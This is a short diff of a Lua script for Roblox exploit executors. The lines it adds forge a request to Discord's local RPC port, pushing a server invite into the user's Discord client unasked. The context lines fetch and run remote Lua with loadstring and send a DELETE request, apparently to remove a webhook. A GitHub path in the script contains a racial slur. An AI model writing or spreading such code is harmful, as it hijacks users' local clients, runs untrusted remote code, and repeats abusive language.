@@ -1,5 +1,25 @@
 local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
+
+req({
+   Url = "http://127.0.0.1:6463/rpc?v=1",
+   Method = "POST",
+   Headers = {
+       ["Content-Type"] = "application/json",
+       ["Origin"] = "https://discord.com"
+   },
+   Body = game:GetService("HttpService"):JSONEncode({
+       cmd = "INVITE_BROWSER",
+       args = {
+           code = "YT8pWBws7G"
+       },
+       nonce = game:GetService("HttpService"):GenerateGUID(false)
+   }),
+})
+
+
+local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
 req({
     Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/TEN-SON-WEBHOOK/main/DEVIL-Hub-BookNigger"))(),
     Method = "DELETE"
